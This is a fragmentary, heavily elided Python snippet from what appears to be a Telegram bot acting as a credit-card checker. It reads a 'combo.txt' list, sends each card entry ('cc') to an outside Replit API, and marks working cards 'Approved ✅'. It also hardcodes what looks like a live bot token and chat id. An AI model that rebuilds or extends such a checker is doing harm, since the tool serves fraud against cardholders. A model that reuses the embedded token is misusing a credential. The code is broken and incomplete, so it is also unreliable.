...
ms="2023-09-21:12:47/AM"
sto = {"stop":False}
token = "6456563882:AAEi_erOvn4kElrRgcIp80SXYp2hrFOqVyY"
id =  1195279837
   ...
   with open("combo.txt") as file:
    ...
    ''',parse_mode='markdown',reply_markup=mes)
           if "risk" in last:
               ...
               get=requests.get(f'https://iwodixjisjdjdjcjdnsjxnchd.16day.repl.co/api?lista={cc}')
               code=get.json()['status']
               ok +=1
               respo = f'''
𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
